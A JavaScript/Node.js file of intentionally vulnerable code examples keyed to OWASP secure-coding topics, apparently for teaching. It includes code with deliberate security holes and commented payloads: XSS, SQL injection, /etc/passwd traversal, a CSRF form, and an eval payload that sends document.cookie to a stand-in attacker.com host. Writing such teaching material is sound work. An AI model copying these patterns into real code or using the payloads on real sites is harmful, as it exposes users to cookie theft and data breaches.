/**
 * VULNERABLE: Secure Coding Practices Examples - JavaScript/Node.js
 * Reference: OWASP Secure Coding Practices Quick Reference Guide
 */

// ============================================
// VULNERABLE: Client-side Input Validation
// ============================================

// BAD: Only client-side validation
function registerUserClientSideOnly() {
    const username = document.getElementById('username').value;
    
    // Client-side validation (can be bypassed!)
    if (username.length < 3) {
        alert("Username too short");
        return;
    }
    
    // Send to server with no server-side validation
    fetch('/api/register', {
        method: 'POST',
        body: JSON.stringify({ username: username })
    });
}


// ============================================
// VULNERABLE: XSS via innerHTML
// ============================================

// VULNERABLE: User data directly into innerHTML
function displayUserComment(comment) {
    const container = document.getElementById('comments');
    
    // CRITICAL: Direct HTML insertion
    container.innerHTML += `<p>${comment}</p>`;
    
    // Payload: <img src=x onerror=alert('XSS')>
    // Result: Alert pops up, attacker has DOM access
}

// VULNERABLE: Using eval (dynamic code execution)
function evaluateExpression(userInput) {
    // NEVER do this with user input!
    const result = eval(userInput);
    
    // Payload: (function() { fetch('https://attacker.com/steal?data=' + document.cookie) })()
    // Result: Attacker gets all cookies
}


// ============================================
// VULNERABLE: SQL Injection (Node.js)
// ============================================

const mysql = require('mysql');
const connection = mysql.createConnection({ /* config */ });

// VULNERABLE: Dynamic SQL query
function getUserVulnerable(username) {
    const query = `SELECT * FROM users WHERE username = '${username}'`;
    
    connection.query(query, (err, results) => {
        if (err) throw err;
        return results[0];
    });
}

// Payload: username = "' OR '1'='1"
// Result: SELECT * FROM users WHERE username = '' OR '1'='1'
// Returns all users!


// ============================================
// VULNERABLE: Hardcoded Secrets
// ============================================

// CRITICAL: API key in code
const API_KEY = "sk-1234567890abcdefghijklmnop";

// CRITICAL: Database password in code
const DB_PASSWORD = "MyDatabasePassword123";

// CRITICAL: JWT secret in code
const JWT_SECRET = "super-secret-key-do-not-share";

// When code is on GitHub, attacker gets everything!


// ============================================
// VULNERABLE: No Password Hashing
// ============================================

// VULNERABLE: Storing plaintext passwords
async function registerUserBadPassword(username, password) {
    const connection = await getDb();
    
    // CRITICAL: Plaintext password!
    await connection.query(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        [username, password]
    );
}

// VULNERABLE: Weak hashing (MD5)
function hashPasswordBadly(password) {
    const crypto = require('crypto');
    
    // MD5 is cryptographically broken!
    return crypto.createHash('md5').update(password).digest('hex');
}


// ============================================
// VULNERABLE: Path Traversal
// ============================================

const express = require('express');
const fs = require('fs');

// VULNERABLE: User input directly as file path
app.get('/file/:filename', (req, res) => {
    const filename = req.params.filename;
    
    // No validation - attacker can use ../
    const filepath = `uploads/${filename}`;
    const content = fs.readFileSync(filepath);
    
    res.send(content);
});

// Payload: /file/../../../../etc/passwd
// Result: Server reads and sends /etc/passwd content!


// ============================================
// VULNERABLE: Missing Access Control
// ============================================

// VULNERABLE: No ownership check
app.get('/api/user/:userId', (req, res) => {
    const userId = req.params.userId;
    
    // No check if current user is authorized
    const user = getUser(userId);
    
    res.json({
        name: user.name,
        email: user.email,
        ssn: user.ssn,  // Sensitive!
        creditCard: user.creditCard  // Sensitive!
    });
});

// Attacker can fetch any user's data by changing userId


// ============================================
// VULNERABLE: Informative Error Messages
// ============================================

// VULNERABLE: Reveals system information
app.get('/api/data', (req, res) => {
    try {
        const data = getData();
        res.json(data);
    } catch (err) {
        // VULNERABLE: Returning full error details
        res.status(500).json({
            error: err.message,
            stack: err.stack,  // Exposes code structure!
            query: err.query   // Exposes database schema!
        });
    }
});


// ============================================
// VULNERABLE: Session Fixation
// ============================================

// VULNERABLE: Not regenerating session ID on login
function loginVulnerable(username, password) {
    if (validateCredentials(username, password)) {
        // VULNERABLE: Just adding user to existing session
        req.session.userId = userId;
        
        // Attacker can use this session before and after login!
    }
}


// ============================================
// VULNERABLE: No HTTPS Enforcement
// ============================================

// VULNERABLE: HTTP connection for sensitive data
async function loginNoHttps(username, password) {
    const response = await fetch('http://example.com/api/login', {
        method: 'POST',
        body: JSON.stringify({ username, password })
        // No HTTPS - credentials in plaintext!
    });
}


// ============================================
// VULNERABLE: Sensitive Data in Local Storage
// ============================================

// VULNERABLE: Storing secrets in local storage
function loginStoreBadly(token, apiKey) {
    // Local storage is accessible via JavaScript!
    localStorage.setItem('token', token);
    localStorage.setItem('apiKey', apiKey);
    
    // Any XSS attack can steal these!
}

// VULNERABLE: Storing in cookies without flags
document.cookie = `token=${token}`;  // No Secure, HttpOnly, SameSite flags


// ============================================
// VULNERABLE: Race Condition
// ============================================

let balance = 1000;

// VULNERABLE: Race condition without locking
async function withdrawMoneyRaceCondition(amount) {
    // Check balance
    if (balance >= amount) {
        // Simulate processing time
        await sleep(100);
        
        // Another thread could have changed balance here!
        balance -= amount;
    }
}

// Scenario:
// 1. Check: balance = 1000, want to withdraw 600 ✓
// 2. Other thread: withdraws 600, balance = 400
// 3. First thread: subtracts 600, balance = -200 (overdraft!)


// ============================================
// VULNERABLE: Unvalidated Redirects
// ============================================

// VULNERABLE: Using user input for redirect
function redirectVulnerable(req, res) {
    const url = req.query.redirect;
    
    // No validation - attacker can redirect to malicious site
    res.redirect(url);
}

// Payload: /api/logout?redirect=https://attacker.com/phishing
// User gets redirected to phishing site!


// ============================================
// VULNERABLE: CSRF - No Token
// ============================================

// VULNERABLE: No CSRF protection
app.post('/transfer', (req, res) => {
    const userId = req.session.userId;
    const amount = req.body.amount;
    const recipient = req.body.recipient;
    
    // No CSRF token validation!
    // Attacker's website can POST a form to this endpoint
    
    processTransfer(userId, amount, recipient);
    res.send("Transfer complete");
});

// Attack HTML:
// <form method="POST" action="https://bank.com/transfer">
//   <input name="amount" value="10000">
//   <input name="recipient" value="attacker">
//   <input type="submit">
// </form>


// ============================================
// VULNERABLE: Logging Sensitive Data
// ============================================

const logger = require('logger');

// VULNERABLE: Logging credentials
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    
    // CRITICAL: Logging password!
    logger.info(`Login attempt: ${username}, password: ${password}`);
    
    if (authenticate(username, password)) {
        // VULNERABLE: Logging token
        const token = generateToken(username);
        logger.info(`User ${username} logged in with token: ${token}`);
        
        res.json({ token });
    }
});


// ============================================
// VULNERABLE: No Rate Limiting
// ============================================

// VULNERABLE: No rate limiting on login endpoint
app.post('/login-no-rate-limit', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    
    // Attacker can brute force passwords with no restrictions
    
    if (authenticate(username, password)) {
        res.json({ success: true });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});


// ============================================
// VULNERABLE: Deserialization Attack
// ============================================

const pickle = require('pickle');

// VULNERABLE: Unsafe deserialization
app.post('/deserialize', (req, res) => {
    const data = req.body.data;
    
    // Dangerous! Can execute arbitrary code
    const obj = pickle.loads(data);
    
    res.json(obj);
});

// Attacker sends pickled object that executes system command


// ============================================
// VULNERABLE: Default Credentials
// ============================================

// VULNERABLE: Not changing default admin credentials
const adminCredentials = {
    username: 'admin',
    password: 'admin123'  // Default password!
};

// Attacker can login with well-known defaults


// ============================================
// VULNERABLE: Information Disclosure
// ============================================

// VULNERABLE: Exposing server version
app.use((req, res, next) => {
    res.header('Server', 'Apache/2.4.41 (Ubuntu)');  // Reveals version!
    next();
});

// VULNERABLE: Exposing framework version
app.use((req, res, next) => {
    res.header('X-Powered-By', 'Express/4.17.1');  // Reveals version!
    next();
});

// Attacker can target known vulnerabilities in these versions
